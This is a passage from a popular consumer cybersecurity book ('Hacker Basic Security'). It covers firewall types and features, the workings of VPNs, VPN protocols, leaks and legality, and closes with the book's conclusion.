On the other hand, a personal firewall is a software, which is installed on the computer you want to be protected. What the software does is to filters both incoming and outgoing traffic, and allows only data, which you have personally requested. Unlike the hardware firewalls, personal firewalls have more features even though they lack the benefit of allowing you share your internet connection with various computers on a single network.

Perhaps, you are thinking, which one is best suited for your protection? Well, that decision will depend on various factors. However, if you want to protect only a single computer, the best option will be a personal firewall else you better go for a hardware firewall if you want to protect multiple computers. Additionally, the hardware firewall wall will be cost-effective when protecting multiple computers. You can also combine both pieces of device to protect your computer. You should consider this as it might be a good idea to safeguard your information, especially if you are looking for an additional level of security.

Important Features of Firewall

In choosing a particular firewall to use, it is imperative to pay special attention to their features. This can make a big difference regarding how your computer is protected against external access. In as much as these features will differ from one individual to another, I have rounded up the most important features to check when considering buying a firewall. Notwithstanding, in terms of security, your focus should be on features such as application protection, stealth mode, notifications, inbound, and outbound filtering. Let us look at each feature individually to give you a glimpse of how important they are.

*   > Inbound and Outbound Filtering

> This feature is unique because it helps determine the information allowed or disallowed. The primary function of a firewall is to allow and discard information based on certain criteria or rules created. It does this task to handle all your security issues. Most people think that inbound filtering is the primary function of a firewall, but they are wrong. Inbound filtering is the process of filtering incoming data towards your computer.

*   > Stealth Mode

> Significantly, your firewall must not just block requests from reaching the computer. It must also appear as if it doesn’t exist on the internet. You are in a stealth mode when your computer even though connected to the internet cannot be detected. Today, hackers have the capabilities of detecting if a particular computer is on the internet by using special data to probe the computer. However, if you are in a stealth mode, the firewall doesn’t return this information to the hackers, thereby making it look like you are offline. Because of this, hackers will stop targeting your computer because to them you are offline.

*   > Privacy Protection

> Protecting your privacy is essential, and you won’t want to jeopardize that for anything. Most firewalls today have the ability to block adware, hijackers, and spyware from having access to your computer. The privacy protection feature enables you to protect your computer from any infection especially with software that reveals private information of users.

*   > Application Integrity

> This feature enables the firewall to monitor files on your computer for issues of modification or how these files are launched. Once the firewall detects any change, it notifies the users and denials the application from running or transmitting data to the internet. Most times, these file modifications may appear like an upgrade; however, a malicious program may have triggered this modification.

*   > Intrusion Detection

> Criminals, intruders, or hackers use various means to hijack your computer security. However, the intrusion detection feature scans all incoming data for signatures of known methods. Furthermore, it notifies you when it has recognized any such attacks. Interestingly, with a firewall, you can know the method by which a hacker or intruder wants to hack your computer.

*   > Notifications

> With this feature, you can know the particular activity going on the firewall, because it has several means of notifying you about any likely penetration or intrusion to your computer.

Popular Firewalls

Due to the widespread security threats in cyberspace, the market is flooded with various kinds of firewalls. These different firewalls have their strengths and weaknesses. However, the following are some personal firewalls you could try:

*   > Zone Alarm Free

*   > Outpost Firewall

*   > Emsisoft Online Armor Free

Commercial personal firewalls

*   > Zone Alarm pro/plus

*   > Outpost Firewall Pro

*   > McAfee Personal Firewalls

Hardware Router or Firewalls vendors

*   > NETGEAR

*   > Linksys

*   > D-Link

*   > Belkin

Conclusion

The importance of getting a firewall to protect your computer isn’t one to be taken for granted. With a firewall, you protect yourself against hackers and viruses. Furthermore, when you integrate a proper rule and monitoring process, you will use your computer confidently without any fear of external threats from anyone. You never leave your home unlocked in a crime dominated area. You always lock it to prevent intruders and robbers from taking your valuables. Why leave your computer open to hackers when you can protect your files and important information through firewalls.

> Chapter 9: Virtual Private Network

Introduction

With the continuous bombardment of online privacy and the constant alarming security threat, many are confronted with, the number of people turning to VPN services is on the rise. For those who may be hearing VPN for the first time, it may seem complicated to use but that is not the case because, in this chapter, I am going to demystify them, explain everything you can use them for, why you should consider using them and how to make them work effectively to your advantage. Additionally, I will make some recommendations to help you if you decide to pick a VPN for yourself.

VPN also is known as Virtual private network is the decisive tool to get the best out of your online freedom and privacy, especially if you spend most of your time online. Having a good VPN is non-negotiable because it allows you to:

*   > Secure your devices from attacks, hackers, and the increased threats of public wireless networks

*   > Restore your privacy through the encryption of your internet traffic, which makes it hard for third parties such as surveillances agencies, network admin and internet providers to read your information

*   > Appear everywhere in the world by exchanging your location and IP address using the VPN server

*   > Unblock any restricted content irrespective of your location

Besides privacy and security concerns, the two factors that drive the usage of VPN are blocked websites and content restrictions. From China to the United States to North American, the number of people depending on the use of VPN to have a private, secure, safe, and unrestricted experience online is constantly on the rise. Why allow your important information stolen or compromised when you have what you need to safeguard yourself. Your information security lies in your hands.

What Is a VPN?

VPN is an acronym for the virtual private network and a service that allows or enables you to have access to the internet privately and safely without any compromise to your information. Furthermore, it allows you to get through restricted contents, which naturally you may not have access to using your normal internet connection. With the VPN, you route your connection via a server that allows you to hide your online activities.

There are some basic terms I want you to understand before we dive deeper into the VPN. With these terms, you can easily understand certain things I will explain in the latter part of this chapter.

*   > VPN  Client – This represents the software that links your device/computer to the VPN service. At times, the “VPN app” and “VPN client” are used consecutively.

*   > VPN Server – This represents a single endpoint in the VPN network where the connection and encryption of your internet traffic takes place

*   > VPN Protocol – This represents the method used by a device to successful create a secured connection to the VPN server.

*   > VPN Service – This represents an entity, which offers you the capability of using their VPN network. Besides this service, they provide VPN software to clients. To access these services, clients must be subscribed to their packages. VPN providers and VPN services are used interchangeably.

How Does VPN Work?

With the strong foundation you have received, it is time to dive into the working principle of a VPN. It is not enough to just subscribe to a VPN service and neglect how it works. Once, you know how it works, you can avoid any loopholes you may intentionally or accidentally open to your attackers or cybercriminals.

VPN uses a simple operation to provide the services you need by encrypting your connection between your computer system and the server. You can consider this encrypted connection to be a protected tunnel that allows you to access everything online while appearing in the location of the VPN server that you are connected to. For instance, you may be in the United States and appear to be connected online in China. The VPN server protects your location and uses its server position as yours. This gives you additional security, a high level of online anonymity, and unrestricted access to the internet irrespective of your location.

![](images/00031.jpg)

From the diagram above, you can see how VPN works. It is hard for hackers or government agencies to monitor and restrict your activities. The tunnel serves as your VPN that protects your online presence and privacy. Does that sound interesting? Well, let’s look at another scenario where there is no VPN used.

![](images/00032.jpg)

What can you say about this second image? Does it look familiar? Of course, it is what people who don’t use VPN go through. The internet comprises of servers with the responsibility of storing websites and allowing anyone who wants to view them. These servers communicate with one another and share important information, including your bank details, security number, etc.  It is great to share and surf online but not good news for your privacy.

When you go online, it is like you boarding a commercial flight. The security personnel, baggage handlers, flight attendants, and the ticket agent will need your data to be able to route you to your city. Something similar happens on the internet, your information goes through various servers. If you are just browsing the internet simply for the fun of it, then you shouldn’t border about anyone seeing your information. However, if it has to do with business email, online banking, or anything sensitive, the story is very different. Without using a VPN, all your online activity is traceable to your physical location. Besides this, your device exposes your IP address. Each computer system or device that you use in connecting to the internet has its own distinct address.

However, with a VPN, you can hide your primary location and use that of the VPN server to protect yourself against cybercriminals who are on the rise. Most VPN service providers maintain their servers throughout the world. This gives users unlimited connection and unrestricted content all round the world. You need to buy or subscribe to these services before these unlimited possibilities can be achieved. Once you buy and download the software to your computer or device, you can connect to anywhere instantly.

Why Use VPN Services?

I know this question will arise in your mind at one point. Why is it that people are using VPN services throughout the world more than ever before? Well, this depends on their situation; however, there are certain situations that necessitate the use of VPN services. These are not limited to the ones I will mention here.

*   > Accessing the internet without revealing their location or authenticate IP address. You can attribute this to online anonymity

*   > Get unrestricted access to certain websites and content from people or country with restrictions because of their location

*   > Providing an additional level of security through the encryption of their internet connection

*   > Bypass censorship by easily getting access to regional restrictions

*   > Prevent network admins, third parties, government agencies, and their internet service provider from spying the activities online

*   > Protect and hider their sensitive private data including photos, credit cards, bank passwords, and other relevant information

*   > Access the internet without any fear of attack or compromise

*   > Protection against cybercriminals or hackers especially when they are using public Wi-Fi connections in airports, hotels, and cafes

*   > To stream media, P2P download and perform torrent activities

Do you still doubt the use of a VPN for your internet connection? So far, you have learned what VPN is, how it works, why you use them. It is important to clear the doubt concerning how safe they are when used.

How Safe is VPN

Today, VPN security is causing a strong debate among various IT professionals. However, it is important to note that no two services can be identical in terms of its security or what it offers. In view of that, once you can confidently say that VPN is safe to use for your internet and information security if it is a high-quality VPN.

![](images/00033.jpg)

Notwithstanding, it doesn’t mean that there are no flaws. Today, there are over 350 VPNs on the market with the increasing number if you consider the free VPN apps we have in the Google Play and Apple stores. Regrettably, these VPNs with free services have bugs, flaws, and poses huge security and privacy threat to your personal information. However, to protect your data and keep you safe from any leak to your information and device, it is important to choose a high-quality VPN.

If possible, you should avoid using any free VPN app or services because recent studies have discovered that about 84% of users’ data leak arises from free Android VPN apps. In as much as most people have come to terms that these apps should be avoided, there are countless millions using them for various activities. There are various reasons why you should avoid using free VPNs if you want to take your online security seriously. These include:

*   > You give third parties access to your sensitive data

*   > Traffic leaks such as DNS and IP address leaks

*   > Stolen bandwidth

*   > Hidden tracking of your activities

*   > Embedded malware, which is common with free VPN

*   > Fraud including financial and identity theft

*   > Browser hijacking

Importantly, be on the watch for various VPN scams ranging from fake reviews, bogus features to lifetime VPN subscriptions. As a standard rule, when you subscribe to a VPN service, you should get what you are paying for.

Are VPN Services Legal?

The answer to this question will vary depending on what part of the world you live in. Well, in the Western world, it is legal to use VPN services as long as they are for security and online privacy. Actually, most businesses use VPN daily and I don’t see this changing anytime soon.

![](images/00034.jpg)

Nevertheless, there are countries such as Saudi Arabia, the United Arab Emirates, Iran, Iraq, North Korea, Oman, Russian, Belarus, and Turkmenistan that don’t allow the use of VPN services. These countries frown at the use of such services because it empowers the users to have access to everything possible online.

For instance, in China, the government has fortified its “Great Firewall” with the aim of blocking websites and VPNs. Notwithstanding, some internet users use certain VPN to get through these issues. Another country whose measure to ban the use of VPNs have failed is Russia because the VPN traffic is hidden and looks like a normal HTTPS traffic.

Importantly, VPN services are used routinely by businesses and private individuals throughout the world for their network security. Hence, it is unlikely for use to see an outright ban on the use of VPN considering their importance for private and business security.

If it is obvious that VPN services help to protect or hide one's IP address and location, can’t people use it for fraudulent or bad activities? Emphatically, yes! However, VPN is like steel because we can use them for various purposes including transportation, buildings, and bridges. Additionally, its usage isn’t limited to these as we have seen the use of steel in making tanks, guns, and building bombs, which harm people. Contrasting the negative impact with its positive influence, are we to say that the ban on steel will yield a better result? Obviously, not because that will be stupid and insane to do. It is like cutting your left leg because of a minor injury that you have.

The same holds true for VPNs and encryption. Businesses, banks, and different websites involved in the use of sensitive data, which must be encrypted and used for daily purposes. Irrespective of how people misuse these encryption and VPN tools, they are needed for our online security and privacy.

Setting Up Virtual Private Network

Your online security and privacy are a priority for me, which is why in this section, I want to enlighten you on the easiest way of setting up your VPN. However, the particular instructions for setting it up may vary depending on the device or system you are using. Another factor is the particular VPN service you may be using. Notwithstanding, the installation procedure in this book is what is recommended by most VPN providers for most devices and operating systems.

The following is a general overview of how to effectively set up your VPN.

*   > Select a good and reliable VPN provider

*   > Subscribe to its package then download the software to your device or operating system

*   > Use the credentials provided after subscription to log into the VPN

*   > Connect to the server of your choice then you can enjoy your online privacy

Users of the following platforms iOS, Android, Mac OS, and Windows have the option to use the inbuilt VPN capability of their operating system. Instead of the OpenVPN, these systems use IPSec/L2TP or IPSec/IKEv2 protocols. Although this may be less costly; however, to enjoy all features and avoid any data leak when online, it is advisable to use a VPN service for your online security and privacy.

The Role of VPN for Online Privacy

Undoubtedly, VPN provides both security and online privacy. As already indicated, without any VPN for your device, your internet service provider, or cybercriminals can monitor and record your online activities easily. This could range from your social media interactions with friends and families, comments you make, websites you visit, your preferences, etc., today, we have various privacy violations where government or agencies require an internet service provider to provide the logs of users browsing and data activities. Therefore, with a VPN, all your internet service providers see is that you are online with your device connected to a VPN server. However, your data is secured and encrypted without third parties having the ability to read your information.

Furthermore, the role of VPN for your online security cannot be underplayed because VPN when connected to a public WiFi, you expose yourself and because a prey for hackers to steal your credit cards, identity, password, and bank accounts, etc. Without a VPN, you single yourself out for possible attacks. If you want to prevent and protect your data from hackers and third parties, it behooves you to consider using a VPN service to encrypt your data.

What About the Issue of Being Anonymous

Another issue to clarify is that because you use a VPN for your online security and privacy doesn’t mean you are 100% anonymous. Actually, considering the number of surveillance agencies including NSA, it is hard to actualize a 100 percent online anonymity.

This shouldn’t deter you from using a VPN because there are steps to implement to help increase your online anonymity. These steps go beyond using the best VPN service. For a start, you can:

*   > Use a secured browser, which safeguards you against browser fingerprinting

*   > Use a reliable ad blocker because some adverts can disguise in tracking your online activities, profiling you, and collecting relevant personal information without your knowledge

Another issue to consider is VPN logs. Paying close attention to your logging policies and logs is very important as it concerns your online privacy. When using a VPN, you must understand that these logs are of various types, which include:

*   > Connection logs – These include times, dates, IP addresses, and connection data. Normally, the connection data is useful in improving the VPN network and potentially dealing with any user challenges that arise. What to note here is to read how these data are secured and how often they will be deleted.

*   > Browsing log – They include virtually everything kind of activity you perform online, which include metadata, IP addresses, times, browsing the history, etc. Peradventure you are using a free VPN, and then it is unlikely for you to maintain the usage of these logs.

*   > No logs – Most VPNs claim they provider “no logs.” Well, from my research, it is only a few VPN service providers that perform this function to their clients.

Performance and Speed of VPN

There are numerous activities that happen when you use a VPN. Your computer or device is performing the encryption and decryption of data packets, which is then routed via a distant VPN server. These processes take resources, time, and affect the overall speed of your internet.

Therefore, to get the best out of your internet speed when using a VPN, it is essential to link up with the closest VPN server that suits your purpose. For instance, if you reside in Canada and want to gain access to blocked content, which is open for individuals in the United States, the best option will be to choose a server in New York rather than a server in California.

A good way to detect a quality VPN service provider is through your internet speed because the service shouldn’t have any impact on your internet speed. Alternatively, if you use a low-quality VPN service, it will considerably decrease your internet speed. What may lead to this is the overload of the server by different users.

In spite of this, you have a role in helping increase your VPN speed. Ensure you patronize a reliable VPN provider with good performance. Additionally, you can connect to a nearby server that is less congested. If these aforementioned options solutions doesn’t work, then you should consider changing your VPN protocols. Furthermore, check your device, your network and internet service provider because this can influence your internet speed.

VPN Protocols and Encryption

In using a VPN, there are various VPN protocols offered by these service providers. However, it is important to know what VPN protocol is all about. In a nonprofessional term, it is a sequence of instructions to set up a secure and encrypted connection between the VPN server and your device for the transfer of data. The following are the common VPN protocol used in the world today:

*   > OpenVPN

> This protocol is one of the most secure and popular protocols used for different types of devices. it is an open-source project, which is developed for multiple types of authentication methods. If you want a versatile VPN protocol that is usable for various devices, then OpenVPN is a perfect choice. Besides this, it offers strong encryption and excellent performance.

*   > IKEv2/IPSec

> IKEv2 is an acronym for Internet Protocol Security with Internet Key Exchange Version 2, which like the former is a secure and fast VPN protocol. It comes automatically preconfigured in most operating systems including iOS, Mac OS, and windows. It functions perfectly for establishing a lost connection again. The drawback to this protocol is that it is not an open-source project because Microsoft and Cisco develop it. It is a perfect choice for people who use mobile devices.

*   > PPTP

> This protocol is an old VPN protocol, which comes inbuilt in most operating systems. Also known as Point-to-Point Tunneling Protocol, it has different security vulnerabilities, which has contributed to it not been considered safe for VPN activities.

*   > L2TP/IPSec

> This is also a decent protocol choice for anyone to make. Layer 2 Tunneling Protocol with Internet Protocol is much secured, unlike the PPTP. Furthermore, the speed isn’t that fast because of the double encapsulation of the data packets. It comes inbuilt in most operating systems and widely used in mobile devices.

*   > WireGuard

> This protocol is new in the industry and aims at better performance and improved security when compared to the previous existing VPN protocols. It hasn’t been audited since it is still under active development. However, some VPN provider supports the use of it only for testing purposes.

VPN on iOS and Android Devices

So far, you know that VPNs can be used on both iOS and Android devices. however, I want to explore the three different ways of using them on these devices.

*   > Through Custom VPN apps – VPN providers provide custom VPN apps for their users for both iOS and Android devices, which are normally stable, fast with different unique features.

*   > Through Third-Party VPN apps – You can use various popular free third-party VPN apps such as OpenVPN for Android to protect your online privacy.

*   > Inbuilt VPN functionality – Some devices come with inbuilt VPN functionalities. For instance, iOS devices have IPSec/IKEv2 whereas Android devices have IPSec/L2TP functionality.

Although VPNs have significantly improved on Android and iOS devices, they can’t be compared to that of a computer system. The reason behind this is that unlike the typical VPN applications, a normal VPN is more complicated and requires connections to encryption, decryption, and external servers. This situation is different from a mobile device, in which connections may be unstable (switch off and on overtime).

Using a VPN on a Router

You can connect your VPN to a route but you must ensure that such route supports a VPN service. With a good router that supports VPN services, you can benefit the following:

*   > Protect your home network against cybercriminals, spying, hacking, or any potential attack

*   > Easily secure and protect yourself against your internet service provider and any surveillance

*   > Your mobile devices can benefit from such service without the installation of a software

![](images/00035.jpg)

However, the secret to getting your setup correctly begins with selecting a reliable VPN provider before choosing the right route. Once this is sorted out, the rest is history. Notwithstanding, the router’s processing power is a major factor to consider in the course of choosing a VPN router.

VPN Leaks

In spite of the benefits of using VPN services for your online privacy and security, a serious issue confronting VPN providers is the challenge of data leaks. Data leaks come in various types with the primary intention of undermining your security and privacy when using a VPN for your device or computer. The following are VPN leaks you may experience when using a VPN service:

*   > IP address leaks – This normally means that your IP address has leaked from the VPN tunnel, thereby exposing your security and location. it can be temporary, short, or a continuous leak depending when you discover it. The primary culprit is normally IPv6 addresses that use VPN that doesn’t properly block or support IPv6

*   > DNS Leaks – This usually takes place when DNS requests leaks from the VPN tunnel and your internet provider begins to process it. It can unveil your location, internet service provider IP address, and your browsing history.

*   > WebRTC leaks – This issue normally arises with Brave, Chrome, Firefox, or any chromium-based browser that uses WebRTC APIs. This kind of leak exposes your IP address via the browser. Regrettably, it doesn’t matter if you are utilizing a reliable or good VPN. However, you can fix these issues in your browser.

To avoid any leak to your IP address, browsing the history, location, or information, it is important to regularly test your VPN to check for any leaks, problems, or vulnerabilities that may affect you in the latter run.

The Future of VPNs

In all fairness, I have touched on every possible angle to your internet privacy and security in regards to VPN. The prospect for VPNs looks bright, even if many don’t consider it for the right reasons. Online censorship, corporate tracking, and mass surveillance will continue to be a driving force for high usage of VPN. We have seen that internet service providers are increasingly blocking access to various websites ranging from torrent to adult content websites.

Furthermore, concerns over users’ privacy and surveillance are increasing swiftly. For instance, in countries like:

*   > The United Kingdom is regarded as the worst country for your privacy. Telephone companies and internet service providers are necessitated by-laws to record text messages, all browsing history, and locations of their customers. These data are offered to the United Kingdom government agencies without any warrant available

*   > In the United States, service providers can legally record browsing details, text messages, and sell information to advertisers. Furthermore, they are obligated to provide relevant information to surveillance agencies as the need arises.

*   > In Australia, which has a similar challenge, the government has implemented a compulsory data retention scheme, which requires telecom operators to collect calls, text messages and internet connection data.

Clearly, performing various online activities without using a reliable VPN will expose you to various dangers in the world. Therefore, to safeguard your data and hinder cybercriminals from invading into your privacy, it is unnegotiable for you to install a VPN service on your device or computer system. Your online privacy and security is a priority if you want to safeguard your data.

> Conclusion

Thank you for making it through to the end of Hacker Basic Security, let’s hope it was informative and able to provide you with all the effective methods of security and the best way to manage your cyber risks. Furthermore, I hope you have learned and understood the various awareness program with attack and defensive strategy tools to avert any attack.

The information contained in this book is priceless considering the increasing network and privacy issues facing the cyberspace. It contains everything to protect yourself against unauthorized access to your network or computer.

I have extensively talked on various topics as it relates to your privacy and network challenges. Let me give you a rundown of what we have learned so far in this book. In Chapter One, I highlighted the fundamentals and importance of cybersecurity and various factors of cybersecurity. Indeed, it is the beginning of your hacker’s basic security.

Understanding cybersecurity in an advanced situation is important. Because of this, I explored the various types of cybersecurity, cybersecurity threats, and essential tips to protect your network against viruses and malware. Besides these, there are breaches in cybersecurity. Equipping yourself with what these data security breach entails, the different types of data security breaches and relevant prevention tools is essential to the safety of your network and computer system.

Furthermore, in chapter Four and Five, I introduced you to the basic means hackers can effectively create havoc to your system. You will learn more about malware and virus. Additionally, you will learn about the detection, prevention, and removal process of malware, and how to prevent computer viruses.

What do you know about cryptography? How can you counter the attack of hackers? Chapter Seven explore more about cryptography, the assumptions of these hackers, and the benefits and future of cryptography. Furthermore, you will learn how to use a firewall and the various important features to look for in a good firewall. Finally, in Chapter Nine, you learned about virtual private networks. Indeed, it contains an extensive explanation of what VPN is all about, their roles in online privacy, and how safe they are. Additionally, you learned how to set up your VPN, connect a router to it, and the future of VPN.

Indeed, you deserve a thumbs up because you have been equipped with the necessary information to effectively monitor your online security. I am assured that you can manage any form of cyber risk with defense and attack strategy to stay ahead in the fight against cybercriminals.

Finally, if you found this book useful in any way, a review on Amazon is always appreciated!